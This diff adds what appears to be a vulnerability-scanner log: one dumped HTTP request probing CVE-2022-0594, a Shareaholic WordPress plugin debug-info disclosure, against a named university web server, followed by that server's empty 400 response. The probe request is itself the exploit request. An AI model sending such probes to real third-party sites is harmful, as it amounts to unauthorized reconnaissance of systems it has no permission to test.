@@ -1,0 +1,29 @@
+[CVE-2022-0594] Dumped HTTP request for https://camel.science.unimelb.edu.au/wp-admin/admin-ajax.php?action=shareaholic_debug_info
+
+
+GET /wp-admin/admin-ajax.php?action=shareaholic_debug_info HTTP/1.1
+Host: camel.science.unimelb.edu.au
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36
+Connection: close
+Accept: */*
+Accept-Language: en
+Accept-Encoding: gzip
+
+
+[CVE-2022-0594] Dumped HTTP response https://camel.science.unimelb.edu.au/wp-admin/admin-ajax.php?action=shareaholic_debug_info
+
+HTTP/1.1 400 Bad Request
+Connection: close
+Transfer-Encoding: chunked
+Cache-Control: no-cache, must-revalidate, max-age=0, no-store, private
+Content-Type: text/html; charset=UTF-8
+Date: Wed, 06 Aug 2025 15:17:29 GMT
+Expires: Wed, 11 Jan 1984 05:00:00 GMT
+Referrer-Policy: strict-origin-when-cross-origin
+Server: openresty
+Vary: Cookie
+X-Content-Type-Options: nosniff
+X-Frame-Options: SAMEORIGIN
+X-Robots-Tag: noindex
+
+0
